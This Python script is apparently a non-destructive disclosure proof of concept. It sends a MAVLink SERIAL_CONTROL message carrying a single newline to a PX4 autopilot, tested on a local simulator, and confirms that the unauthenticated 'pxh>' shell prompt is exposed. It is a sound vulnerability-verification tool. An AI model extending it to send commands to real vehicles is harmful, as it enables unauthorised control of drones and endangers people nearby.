#!/usr/bin/env python3
"""PX4 MAVLink SERIAL_CONTROL(SHELL) unauthenticated shell prompt exposure (verification PoC).

This PoC is intentionally non-destructive:
- sends a single newline as shell input
- verifies the reply contains the pxh> prompt
- does NOT send any shell commands

Tested target: PX4 SITL localhost UDP (default 127.0.0.1:18570  remote port 14550).
"""

from __future__ import annotations

import sys
import time

from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mav2

from disclosure._shared.mavlink_poc_common import (
    UdpEndpoint,
    MavUdpClient,
    build_arg_parser,
    wait_for_any,
)


def main() -> int:
    ap = build_arg_parser("SERIAL_CONTROL(SHELL) prompt exposure verification")
    ap.add_argument("--exclusive", action="store_true", help="Also set SERIAL_CONTROL_FLAG_EXCLUSIVE")
    args = ap.parse_args()

    c = MavUdpClient(
        bind=UdpEndpoint(args.bind_host, args.bind_port),
        target=UdpEndpoint(args.target_host, args.target_port),
        sysid=args.sysid,
        compid=args.compid,
    )

    # Encourage partner binding
    for _ in range(5):
        c.send_heartbeat()
        c.send_ping()
        time.sleep(0.05)

    # Optional: wait for any response to confirm link is alive
    _ = wait_for_any(c, ["HEARTBEAT", "PING", "SYS_STATUS", "STATUSTEXT"], timeout_s=min(2.0, args.timeout))

    flags = mavutil.mavlink.SERIAL_CONTROL_FLAG_RESPOND
    if args.exclusive:
        flags |= mavutil.mavlink.SERIAL_CONTROL_FLAG_EXCLUSIVE

    payload = bytearray(70)
    payload[0] = 0x0A  # newline

    msg = mav2.MAVLink_serial_control_message(
        mavutil.mavlink.SERIAL_CONTROL_DEV_SHELL,
        flags,
        0,  # timeout
        0,  # baudrate
        1,  # count
        payload,
    )

    c.send(msg)

    deadline = time.time() + args.timeout
    while time.time() < deadline:
        m = c.recv(timeout_s=0.5)
        if m is None:
            continue
        if m.get_type() != "SERIAL_CONTROL":
            continue

        out = bytes(m.data)
        if b"pxh>" in out:
            print("PASS: received SERIAL_CONTROL reply containing 'pxh>'")
            print(f"reply.device={m.device} reply.flags={m.flags} reply.count={m.count}")
            # Print only a short preview (avoid leaking arbitrary memory in logs)
            preview = out.split(b"\x00", 1)[0]
            print("reply.data_preview=", preview[:80])
            return 0

    print("FAIL: did not observe a SERIAL_CONTROL reply containing 'pxh>' within timeout")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
